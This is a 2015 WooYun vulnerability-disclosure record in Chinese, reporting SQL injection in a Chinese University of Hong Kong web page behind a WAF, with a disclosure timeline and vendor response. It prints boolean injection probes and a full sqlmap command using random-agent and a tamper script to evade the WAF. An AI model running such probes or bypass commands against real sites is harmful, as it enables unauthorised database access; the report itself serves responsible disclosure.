{"id": 77306, "wybug_id": "wooyun-2015-0162810", "wybug_title": "香港中文大学网站存在SQL注入漏洞，有waf可绕过（香港地區）", "wybug_corp": "香港中文大学", "wybug_author": "兔小白", "wybug_date": "2015-12-20 20:13", "wybug_open_date": "2016-02-01 10:51", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(hkcert香港互联网应急协调中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-01：\t细节向公众公开  简要描述： 网站存在SQL注入漏洞，有waf，可以绕过 详细说明：  注入地址：http://**.**.**.**/~music/sc/news.php?pid=63手工测试http://**.**.**.**/~music/sc/news.php?pid=63%27   访问显示异常http://**.**.**.**/~music/sc/news.php?pid=63%20and%201=1  返回正常http://**.**.**.**/~music/sc/news.php?pid=63%20and%201=2 返回异常   漏洞证明：  在实际的过程中有waf，遇到如下情况1、直接使用sqlmap的-u 参数是没有办法进行注入的。如下图：\n\n在这种情况下使用--random-agnet,就可以正常了。2、在使用了random-agent之后，还是会出现问题。这个时候我们需要使用sqlmap的tamper。最后攻击的命令行为：python sqlmap.py -u \"http://**.**.**.**/~music/sc/news.php?pid=63\"  --random-agent --tamper versionedmorekeywords.py --batch结果如下：\n\n   修复方案：  1、还是修改源码对其进行参数过滤。   版权声明：转载请注明来源 兔小白@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-12-21 10:04 厂商回复： 已將事件通知有關機構 最新状态： 2016-02-02：相關機構回報已關閉有關漏洞系統以待修復  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}